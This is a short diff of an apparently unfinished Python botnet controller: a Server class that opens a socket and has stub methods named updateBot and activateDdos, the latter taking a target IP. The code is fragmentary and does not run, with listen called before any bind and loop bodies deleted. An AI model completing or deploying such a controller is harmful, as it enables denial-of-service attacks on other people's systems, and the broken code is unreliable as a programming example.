@@ -1,16 +1,16 @@
 import os
 import socket
+
 class Server:
     
     def __init__(self):
-        self.connections = []   
+        self.connections = [] 
+        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.address = ('localhost',10000)
+        self.sock.listen(1000)  
     
     def updateBot(self,data):
-        for connection in self.connections:
-            
         
-    def refresh(self):
-        self.connections = 
             
     def activateDdos(self,ip):
         
